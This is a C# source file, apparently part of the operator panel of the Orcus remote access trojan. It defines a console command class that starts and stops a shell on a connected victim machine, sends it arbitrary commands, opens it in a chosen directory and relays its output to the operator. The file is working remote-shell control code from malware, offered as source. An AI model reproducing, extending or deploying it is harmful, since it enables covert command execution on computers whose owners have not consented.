using System;
using System.Collections.Generic;
using System.Text;
using System.Windows;
using Orcus.Administration.Plugins;
using Orcus.Administration.Plugins.CommandViewPlugin;
using Orcus.Shared.Commands.Console;

namespace Orcus.Administration.Commands.Console
{
    [DescribeCommandByEnum(typeof (ConsoleCommunication))]
    public class ConsoleCommand : Command
    {
        public bool IsEnabled { get; set; }
        public event EventHandler Started;
        public event EventHandler Stopped;
        public event EventHandler<string> ConsoleLineReceived;

        public override async void ResponseReceived(byte[] parameter)
        {
            if (parameter == null || parameter.Length == 0)
            {
                LogService.Error((string) Application.Current.Resources["ConsoleErrorEmptyResponse"]);
                return;
            }

            switch ((ConsoleCommunication) parameter[0])
            {
                case ConsoleCommunication.ResponseNewLine:
                    await Application.Current.Dispatcher.BeginInvoke(
                        new Action(
                            () =>
                                ConsoleLineReceived?.Invoke(this,
                                    Encoding.UTF8.GetString(parameter, 1, parameter.Length - 1))));
                    break;
                case ConsoleCommunication.ResponseConsoleOpen:
                    LogService.Receive((string) Application.Current.Resources["ConsoleStarted"]);
                    await Application.Current.Dispatcher.BeginInvoke(new Action(() =>
                    {
                        IsEnabled = true;
                        Started?.Invoke(this, EventArgs.Empty);
                    }));
                    break;
                case ConsoleCommunication.ResponseConsoleClosed:
                    LogService.Receive((string) Application.Current.Resources["ConsoleClosed"]);
                    await Application.Current.Dispatcher.BeginInvoke(new Action(() =>
                    {
                        IsEnabled = false;
                        Stopped?.Invoke(this, EventArgs.Empty);
                    }));
                    break;
                default:
                    throw new ArgumentOutOfRangeException();
            }
        }

        public void Start()
        {
            if (IsEnabled)
                return;

            LogService.Send((string) Application.Current.Resources["StartConsole"]);
            ConnectionInfo.SendCommand(this, new[] {(byte) ConsoleCommunication.SendStart});
        }

        public void Stop()
        {
            if (!IsEnabled)
                return;

            LogService.Send((string) Application.Current.Resources["StopConsole"]);
            ConnectionInfo.SendCommand(this, new[] {(byte) ConsoleCommunication.SendStop});
        }

        public void SendCommand(string command)
        {
            var package = new List<byte> {(byte) ConsoleCommunication.SendCommand};
            package.AddRange(Encoding.UTF8.GetBytes(command));
            ConnectionInfo.SendCommand(this, package.ToArray());
        }

        public void OpenConsoleInPath(string path)
        {
            LogService.Send((string) Application.Current.Resources["StartConsole"]);
            var pathData = Encoding.UTF8.GetBytes(path);
            var data = new byte[pathData.Length + 1];
            data[0] = (byte) ConsoleCommunication.OpenConsoleInPath;
            Array.Copy(pathData, 0, data, 1, pathData.Length);
            ConnectionInfo.SendCommand(this, data);
        }

        protected override uint GetId()
        {
            return 5;
        }
    }
}